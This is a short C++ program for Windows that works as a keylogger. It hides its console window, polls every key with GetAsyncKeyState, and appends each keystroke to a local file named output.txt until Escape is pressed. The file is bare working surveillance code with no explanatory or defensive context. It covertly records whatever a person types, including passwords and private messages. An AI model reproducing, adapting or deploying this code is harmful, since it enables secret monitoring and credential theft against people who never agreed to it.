#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;


int main()
{
    //Hide the Window
    HWND window;
    window = FindWindowA("ConsoleWindowClass",NULL);
    AllocConsole();
    ShowWindow(window, 0);
    //Temp output file
    string outfile = "output.txt";
    ofstream output;
    output.open(outfile);
    int stopKey = 0x1b;
    bool ongoing = true;
	while (ongoing) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{   
			if (GetAsyncKeyState(KEY) == -32767) {
                output << char(KEY);
                //stop on escape
                if(KEY == stopKey){
                    output.close();
                    exit(0);
                    }
				}
			}
            // to not use much cpu
            Sleep(100);
		}
        output.close();
}


